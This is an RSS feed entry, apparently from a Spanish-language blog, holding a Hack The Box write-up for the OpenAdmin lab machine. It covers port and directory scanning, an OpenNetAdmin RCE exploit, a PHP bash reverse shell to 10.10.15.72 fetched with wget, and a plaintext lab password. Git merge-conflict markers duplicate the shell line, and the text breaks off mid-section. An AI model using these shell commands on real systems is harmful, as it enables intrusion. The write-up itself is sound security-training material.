<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" 
  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
  xmlns:dc="http://purl.org/dc/elements/1.1/" 
  xmlns:atom="http://www.w3.org/2005/Atom" 
  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
  xmlns:media="http://search.yahoo.com/mrss/">
  <channel>
    <title>OpenNetAdmin on sckull</title>
    <link>https://sckull.github.io/tags/opennetadmin/</link>
    <description>Recent content in OpenNetAdmin on sckull</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>es</language>
    <copyright>©{year}, All Rights Reserved</copyright>
    <lastBuildDate>Sat, 02 May 2020 00:00:00 +0000</lastBuildDate>
    <sy:updatePeriod>daily</sy:updatePeriod>
    <sy:updateFrequency>daily</sy:updateFrequency>
    
        <atom:link href="https://sckull.github.io/tags/opennetadmin/index.xml" rel="self" type="application/rss+xml" />
    
    
    

      
      <item>
        <title>Hack The Box - OpenAdmin</title>
        <link>https://sckull.github.io/posts/openadmin/</link>
        <pubDate>Sat, 02 May 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 02 May 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/openadmin/</guid>
        <description>OpenAdmin es una maquina de HackTheBox donde encontramos una vulnerabilidad RCE en OpenNetAdmin que aprovechamos para ejecutar una shell inversa.</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;OpenAdmin es una maquina de HackTheBox donde encontramos una vulnerabilidad RCE en OpenNetAdmin que aprovechamos para ejecutar una shell inversa. Accedimos al siguiente usuario con contraseñas almacenadas. Tras analizar el codigo fuente de una pagina, ejecutamos un Tunnel para obtener esta localmente y finalmente obtener una clave privada para acceder a otro usuario por SSH. Escalamos privilegios utilizando Nano e informacion de GTFOBins.&lt;/p&gt;
&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/222&#34;&gt;OpenAdmin&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Linux&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;20&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;10.10.10.171&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34; style=&#34;margin: auto;&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/82600&#34;&gt;del_KZx497Ju&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/82600&#34; class=&#34;img_user_maker&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;a href=&#34;#single__title&#34; class=&#34;button&#34; style=&#34;width: 72px; height: 30px; pointer-events: none;&#34;  data-color=&#34;default&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&gt;
  &lt;span class=&#34;button__text&#34;&gt;
    Matrix
  &lt;/span&gt;
&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;div class=&#34;box&#34;&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-chart&#34; data-lang=&#34;chart&#34;&gt;{
   &amp;quot;type&amp;quot;:&amp;quot;radar&amp;quot;,
   &amp;quot;data&amp;quot;:{
      &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
      &amp;quot;datasets&amp;quot;:[
         {
            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[6.8, 5.1, 7.1, 2.9, 4.9],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
         },
         { 
            &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
            &amp;quot;data&amp;quot;:[0, 0, 0, 0, 0],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
         }
      ]
   },
    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h1&gt;
&lt;p&gt;Escaneo de puertos tcp y servicios con masscan y nmap.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Starting masscan 1.0.5 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2020-01-08 05:54:56 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 22/tcp on 10.10.10.171 
Discovered open port 80/tcp on 10.10.10.171

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Tue Jan  7 23:51:39 2020 as: nmap -p- --min-rate 1000 -sV -sC -o nmap_scan 10.10.10.171&lt;/span&gt;
Warning: 10.10.10.171 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.171
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.15s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65528&lt;/span&gt; closed ports
PORT      STATE    SERVICE    VERSION
22/tcp    open     tcpwrapped
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp    open     http       Apache httpd 2.4.29 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.29 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Apache2 Ubuntu Default Page: It works
16874/tcp filtered unknown
31545/tcp filtered unknown
40838/tcp filtered unknown
42307/tcp filtered unknown
47055/tcp filtered unknown

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Tue Jan  7 23:53:43 2020 -- 1 IP address (1 host up) scanned in 123.98 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;http&#34;&gt;HTTP&lt;/h1&gt;
&lt;p&gt;Pagina por default de Apache.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_00-02-04.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;gobuster---http&#34;&gt;GOBUSTER - HTTP&lt;/h2&gt;
&lt;p&gt;Busqueda de directorios y archivos con gobuster.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/htb/openadmin# gobuster dir -u http://10.10.10.171 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t &lt;span class=&#34;m&#34;&gt;115&lt;/span&gt; -x php,html,txt -q
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/music &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/artwork &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/sierra &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/marga &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;music&#34;&gt;/music&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_19-37-40.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;sierra&#34;&gt;/sierra&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_19-38-03.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;marga&#34;&gt;/marga&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_19-38-47.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;artwork&#34;&gt;/artwork&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_19-39-21.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;opennetadmin-1811---rce&#34;&gt;OpenNetAdmin 18.1.1 - RCE&lt;/h1&gt;
&lt;p&gt;En la pagina de &lt;code&gt;/music&lt;/code&gt; encontramos que la pagina login nos redirige hacia otra pagina diferente (/ona), en la cual esta corriendo el gestor OpenNetAdmin en su version &lt;code&gt;18.1.1&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_19-41-27.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Este gestor tiene una vulnerabilidad del tipo RCE y encontramos un exploit (&lt;a href=&#34;https://www.exploit-db.com/exploits/47691&#34;&gt;&lt;strong&gt;OpenNetAdmi - ExploitDB&lt;/strong&gt;&lt;/a&gt; ) que aprovecha esta vulnerabilidad, ejecutamos dicho exploit pasandole la url como parametro.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_19-46-01.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;user---jimmy&#34;&gt;USER - Jimmy&lt;/h1&gt;
&lt;p&gt;Ahora que podemos ejecutar comandos vamos a actualizar nuestra shell a una shell inversa utilizando PHP, descargando el archivo y abriendolo en el navegador para ejecutarlo.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
<<<<<<< HEAD
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.15.72/1227 0&amp;gt;&amp;amp;1&amp;#39;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
=======
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.15.72/1227 0&amp;gt;&amp;amp;1&amp;#39;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
>>>>>>> 23f7fea229b3a22c96ab504c60b48069479aad9c
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Descargamos en la maquina:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;wget 10.10.15.72/sc.php
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Obtenemos nuestra shell inversa:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_19-48-48.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Entre los archivos de configuracion de la base de datos de OpenNetAdmin encontramos las credenciales para acceder a la base de datos, utilizamos la contraseña para obtener una shell con el usuario Jimmy.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_19-50-42.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Jimmy:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_19-51-24.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Credenciales:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;jimmy:n1nj4W4rri0R!
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;user---joanna&#34;&gt;USER - Joanna&lt;/h1&gt;
&lt;p&gt;Dentro de la carpeta &lt;code&gt;/var/www/&lt;/code&gt; donde usualmente se encuentran las paginas de apache, vemos que jimmy tiene permisos en una de las carpetas.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_19-52-59.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Cambiamos nuestra shell a SSH con el usuario Jimmy para poder enumerar los archivos dentro de la carpeta &lt;code&gt;/home&lt;/code&gt; y &lt;code&gt;/var/www&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_19-52-59.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En la carpeta principal de Jimmy encontramos un archivo PHP - post.php el cual hace una solicitud con curl (en PHP) enviando un usuario y contraseña y obtiene el resultado de la solicitud.&lt;br /&gt;
